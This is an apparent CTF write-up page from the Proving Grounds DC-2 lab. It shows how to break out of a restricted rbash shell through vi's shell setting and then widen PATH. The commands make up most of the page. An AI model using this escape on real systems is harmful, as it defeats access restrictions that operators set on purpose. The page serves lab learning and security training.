---
layout: default
title: rBash Issue
parent: Shells
nav_order: 1
---

# rBash Issue

---

## Break out to /bin/bash Shell

We initially do not have the ability to run any commands and receive _rbash_ errors.

![error](.././../../assets/images/ctfs/proving_grounds/dc-2/error.png)

We can overcome this by using _vi_ to break out to a _/bin/bash_ shell

```bash
tom@DC-2:~$ vi

# Set the "shell" variable in vi text  editor
:set shell=/bin/bash
return

# Call the "shell" variable to exit vi with a /bin/bash shell
:shell
return

# Export PATH to global distro paths
tom@DC-2:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp

```

![set_shell](../../../../assets/images/ctfs/proving_grounds/dc-2/set_shell.png)

![use_shell](../../../../assets/images/ctfs/proving_grounds/dc-2/use_shell.png)
